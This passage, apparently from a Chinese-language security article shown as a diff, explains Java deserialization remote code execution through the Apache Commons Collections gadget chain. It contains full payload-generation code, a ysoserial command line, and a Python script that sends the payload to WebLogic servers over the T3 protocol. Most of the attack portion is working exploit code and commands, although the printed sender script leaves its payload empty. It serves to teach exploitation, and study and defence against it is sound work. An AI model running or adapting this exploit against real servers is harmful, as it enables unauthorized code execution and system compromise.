@@ -1,0 +1,114 @@
+        map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+        Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();
+        onlyElement.setValue("foobar");
+    }
+当上面的代码运行到setValue()时,就会触发ChainedTransformer中的一系列变换函数:首先通过ConstantTransformer获得Runtime类,进一步通过反射调用getMethod找到invoke函数,最后再运行命令calc.exe。
+但是目前的构造还需要依赖于触发Map中某一项去调用setValue(),我们需要想办法通过readObject()直接触发。
+我们观察到java运行库中有这样一个类AnnotationInvocationHandler,这个类有一个成员变量memberValues是Map类型,如下所示:
+    class AnnotationInvocationHandler implements InvocationHandler, Serializable {
+        private final Class type;
+        private final Map memberValues;
+        AnnotationInvocationHandler(Class type, Map memberValues) {
+            this.type = type;
+            this.memberValues = memberValues;
+        }
+        ...
+更令人惊喜的是,AnnotationInvocationHandler的readObject()函数中对memberValues的每一项调用了setValue()函数,如下所示:
+    private void readObject(java.io.ObjectInputStream s)
+        throws java.io.IOException, ClassNotFoundException {
+        s.defaultReadObject();
+        // Check to make sure that types have not evolved incompatibly
+        AnnotationType annotationType = null;
+        try {
+            annotationType = AnnotationType.getInstance(type);
+        } catch(IllegalArgumentException e) {
+            // Class is no longer an annotation type; all bets are off
+            return;
+        }
+        Map> memberTypes = annotationType.memberTypes();
+        for (Map.Entry memberValue : memberValues.entrySet()) {
+            String name = memberValue.getKey();
+            Class memberType = memberTypes.get(name);
+            if (memberType != null) {  // i.e. member still exists
+                Object value = memberValue.getValue();
+                if (!(memberType.isInstance(value) ||
+                      value instanceof ExceptionProxy)) {
+                    // 此处触发一些列的Transformer
+                    memberValue.setValue(
+                        new AnnotationTypeMismatchExceptionProxy(
+                            value.getClass() + "[" + value + "]").setMember(
+                                annotationType.members().get(name)));
+                }
+            }
+        }
+    }
+因此,我们只需要使用前面构造的Map来构造AnnotationInvocationHandler,进行序列化,当触发readObject()反序列化的时候,就能实现命令执行。另外需要注意的是,想要在调用未包含的package中的构造函数,我们必须通过反射的方式,综合生成任意代码执行的payload的代码如下:
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = new Transformer[] {
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer("getMethod", new Class[] {
+                String.class, Class[].class }, new Object[] {
+                "getRuntime", new Class[0] }),
+            new InvokerTransformer("invoke", new Class[] {
+                Object.class, Object[].class }, new Object[] {
+                null, new Object[0] }),
+            new InvokerTransformer("exec", new Class[] {
+                String.class }, new Object[] {"calc.exe"})};
+        Transformer transformedChain = new ChainedTransformer(transformers);
+        Map innerMap = new hashMap();
+        innerMap.put("value", "value");
+        map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
+        ctor.setAccessible(true);
+        Object instance = ctor.newInstance(Target.class, outerMap);
+        File f = new File("payload.bin");
+        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
+        out.writeObject(instance);
+        out.flush();
+        out.close();
+    }
+以上解释了如何通过Apache Commons Collections 3这个库中的代码,来构造序列化对象,使得程序在反序列化时可以立即实现任意代码执行。
+我们可以直接使用工具yoserial[2][5]来生成payload,当中包含了4种通用的payload:Apache Commons
+Collections 3和4,Groovy,Spring,只要目标应用的Class
+Path中包含这些库,yoserial生成的payload即可让readObject()实现任意命令执行。
+yoserial当中针对Apache Commons Collections
+3的payload也是基于TransformedMap和InvokerTransformer来构造的,而在触发时,并没有采用上文介绍的AnnotationInvocationHandler,而是使用了java.lang.reflect.Proxy中的相关代码来实现触发。此处不再做深入分析,有兴趣的读者可以参考yoserial的源码。
+****
+**4 漏洞利用实例**
+4.1 利用过程概述
+首先拿到一个Java应用,需要找到一个接受外部输入的序列化对象的接收点,即反序列化漏洞的触发点。我们可以通过审计源码中对反序列化函数的调用(例如readObject())来寻找,也可以直接通过对应用交互流量进行抓包,查看流量中是否包含java序列化数据来判断,java序列化数据的特征为以标记(ac
+ed 00 05)开头。
+确定了反序列化输入点后,再考察应用的Class Path中是否包含Apache Commons
+Collections库(yoserial所支持的其他库亦可),如果是,就可以使用yoserial来生成反序列化的payload,指定库名和想要执行的命令即可:
+    java -jar ysoserial-0.0.2-SNAPSHOT-all.jar CommonsCollections1 'id >> /tmp/redrain' > payload.out
+通过先前找到的传入对象方式进行对象注入,数据中载入payload,触发受影响应用中ObjectInputStream的反序列化操作,随后通过反射调用Runtime.getRunTime.exec即可完成利用。
+4.2 WebLogic
+参照[3]中的方法,对安装包文件grep受影响的类InvokerTransformer:
+    root@f45f0209fa11:/opt/OracleHome# grep -R InvokerTransformer ./
+    Binary file ./oracle_common/modules/com.bea.core.apache.commons.collections.jar matches
+接着通过寻找接收外部输入的点,来让我们发送序列化对象。
+WebLogic外部只开了一个7001端口,这个端口接受HTTP,T3,SNMP协议,判断协议类型后再把数据路由到内部正确的位置,通过在server上抓包,发现走T3协议时携带了java序列化对象,所以我们只用把这个包文从序列化开始的标记(ac
+ed 00 05)后加入payload,重放这个数据,完成利用。
+以下是breenmachine的完整利用脚本:
+    #!/usr/bin/python
+    import socket
+    import sys
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_address = (sys.argv[1], int(sys.argv[2]))
+    print 'connecting to %s port %s' % server_address
+    sock.connect(server_address)
+    # Send headers
+    headers='t3 12.2.1nAS:255nHL:19nMS:10000000nPU:t3://us-l-breens:7001nn'
+    print 'sending "%s"' % headers
+    sock.sendall(headers)
+    data = sock.recv(1024)
+    print >>sys.stderr, 'received "%s"' % data
+    payloadObj = open(sys.argv[3],'rb').read()
+    payload=''
+    print 'sending payload...'
+    '''outf = open('payload.tmp','w')
+    outf.write(payload)
+    outf.close()'''
+    sock.send(payload)
+在weblogic的利用中,有个小坑是不能破坏原始T3协议数据中包装的java对象。
